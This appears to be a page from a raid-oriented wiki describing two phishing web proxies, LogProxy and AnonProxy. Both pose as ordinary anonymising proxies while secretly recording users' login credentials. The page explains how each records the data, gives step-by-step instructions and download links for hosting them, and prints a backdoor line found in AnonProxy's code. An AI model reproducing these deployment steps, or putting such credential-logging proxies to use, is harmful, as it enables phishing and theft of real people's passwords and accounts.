
# Zelune Proxy #

**LogProxy** is a new method of Phishing, and it works by putting out a full functional web proxy, that happens to record authentication information.

## Technical Details ##

Some information on what the script does.

### Browsing ###

The script browses basically the same as a regular [Zelune](http://anonym.to/http://zelune.com/) [proxy](/proxy), except it records MySpace authentication information. It also handles JavaScript, SSL, and POST/GET data.

### Recording ###

LogProxy works through a mod on line 77-126 of index.php. When it handles POST data, instead of simply looping through the post data to transfer it to a new array, it checks to see if an email key of post data is found, if it is, then it notes that auth data is present, and then acts upon it when the loop is finished. When the loop finishes, it sees that the auth data is present, and then records the user name and password to a text file.

### Tracker ###

To make sure no selfish asshole makes the script their own personal thing, LogProxy was made to tell a tracker where all the LogProxy scripts are. This lets anon post Xbox hueg proxy lists.

## Instructions ##


### Setting up a web host ###

Try and find a free host only that works (and won't take down your site for the high server load), or set it up on your own computer. Note that you need PHP and cUrl to work.<br>
_A list of hosts that support PHP is available at web hosts_

### Putting up Files ###

You can find the package <s>[here](http://anonym.to/http://raid.partyvan.info/store/tools/zelune/logproxy.tar.gz). Download it, extract it, then upload the files to your web host. Further instructions found in howto.txt

### Finishing Up ###

Open the proxy in your browser, and go to myspace.com. Make up a fake user name and password to enter, so that the tracker is informed of its existence.

# AnonProxy #

AnonProxy is a modification to the popular web-based proxy script "PHProxy." The modifications allow the one hosting the proxy to record any data sent through it, as determined by a customizable list of keywords. Whenever data is sent through the proxy, the list of keywords (such as "password" or "login") is looked for. If they're found, the current batch of data is written to the log file. The "Keywords" are really regular expressions, so complex rules for recording data can be created.
As of version 1.5, you can specify a list of URLS that AnonProxy should redirect to somewhere else. AnonProxy will proxy the alternate page, instead of the requested page, but display it as the requested page.
Customizable features of AnonProxy include:

* List of keywords (regular expressions) that will trigger a recording.
* List of keywords (regular expressions) that don't count, even if they're on the first list.
* List of urls (regular expressions or not, your choice) for which AnonProxy will use a different page of your choosing as the source.
* Logfile name
* Proxy title
* Proxy "script version"
Installation is as simple as uploading the three files to a web host that supports PHP.

### Warning ###

Whoever created this script put a backdoor in it whereby the logfile name will be revealed (in base64-encoded form) if you specify the GET options 'kjfb' and 'allahuallahackbar'.
Variants on this:
    http://<proxy_url>?kjfb=anything&allahuallahackbar=anything
This is implemented in line 799 of index.php:
    if(isset($_GET["kjfb"]) && isset($_GET["allahuallahackbar"])) {echo base64_encode($_config["logfile"])."\r\n";}
TL;DR delete or comment out the line above (should be on line 799).
[AnonProxy 1.5](http://anonym.to/http://rapidshare.com/files/96635963/AnonProxy1.5.rar)
[AnonProxy 1.5](http://anonym.to/http://www.filedropper.com/anonproxy15)
{{tools}}
{{DEFAULTSORT:Logproxy}}
